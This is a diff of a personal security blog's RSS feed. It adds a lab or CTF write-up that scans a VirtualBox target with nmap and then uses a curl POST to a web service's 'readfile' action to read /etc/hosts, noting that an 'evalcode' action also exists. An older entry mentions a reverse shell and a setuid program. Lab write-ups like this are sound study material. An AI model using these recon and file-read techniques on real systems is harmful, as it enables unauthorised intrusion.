@@ -1,5 +1,90 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 20 Nov 2025 10:39:42 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>bash字分割 文件名扩展</title><link>https://faabbi.github.io/post/bash-zi-fen-ge-%20-wen-jian-ming-kuo-zhan.html</link><description>接到反弹shell后，在opt下发现具有s位的程序，并且在家目录发现备份文件
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sat, 22 Nov 2025 04:04:35 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>VM1-MJ</title><link>https://faabbi.github.io/post/VM1-MJ.html</link><description># 1.信息收集
+
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sn 192.168.2.0/24                      
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:42 EST
+Nmap scan report for 192.168.2.1
+Host is up (0.0088s latency).
+MAC Address: B4:5F:84:E2:C0:16 (zte)
+Nmap scan report for 192.168.2.2
+Host is up (0.079s latency).
+MAC Address: 6A:67:09:D1:B0:56 (Unknown)
+Nmap scan report for 192.168.2.6
+Host is up (0.000079s latency).
+MAC Address: C8:8A:9A:D9:80:32 (Intel Corporate)
+Nmap scan report for 192.168.2.84
+Host is up (0.00037s latency).
+MAC Address: 08:00:27:B6:85:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.2.60
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 18.87 seconds
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.84       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:42 EST
+Nmap scan report for 192.168.2.84
+Host is up (0.00061s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+80/tcp   open  http
+222/tcp  open  rsh-spx
+9000/tcp open  cslistener
+MAC Address: 08:00:27:B6:85:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p80,222,9000 192.168.2.84   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:43 EST
+Nmap scan report for 192.168.2.84
+Host is up (0.00032s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+222/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 35:24:47:15:81:af:ee:0a:51:d5:34:53:52:86:42:9e (RSA)
+|   256 52:c2:56:d3:6c:0d:e5:02:76:83:00:bf:5e:73:64:51 (ECDSA)
+|_  256 1a:8e:9c:db:11:ad:da:2d:cd:76:31:d1:fc:e5:ef:8d (ED25519)
+9000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.12)
+|_http-title: CTF Arbitrator
+|_http-server-header: Werkzeug/3.1.3 Python/3.12.12
+MAC Address: 08:00:27:B6:85:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
+```
+可以看到靶机开放80，222(ssh)，9000(http)
+
+80端口访问位apache默认页面，目录扫描未发现隐藏信息，不再展示
+
+# 2.web渗透
+
+访问9000端口，可以看到接收json然后传入只对本地开放的8080以及5000端口
+
+`&lt;!-- {'action':'readfile','file':'/etc/hosts'} --&gt;`
+源码注释有提示，经过几轮测试发现，action支持readfile，evalcode，对应的第二个参数分别是file以及code
+
+```
+curl -X POST -d 'json_payload={'action':'readfile','file':'/etc/hosts'}' http://192.168.2.84:9000/submit
+
+{
+    'content': '127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n172.17.0.2\ta073427b45da\n',
+    'filename': '/etc/hosts'
+}
+```
+可以看到hosts文件有个内网ip对应一个docker容器。</description><guid isPermaLink="true">https://faabbi.github.io/post/VM1-MJ.html</guid><pubDate>Sat, 22 Nov 2025 04:04:05 +0000</pubDate></item><item><title>bash字分割 文件名扩展</title><link>https://faabbi.github.io/post/bash-zi-fen-ge-%20-wen-jian-ming-kuo-zhan.html</link><description>接到反弹shell后，在opt下发现具有s位的程序，并且在家目录发现备份文件
 ```
 www-data@motto:/opt$ ls -al
 total 32
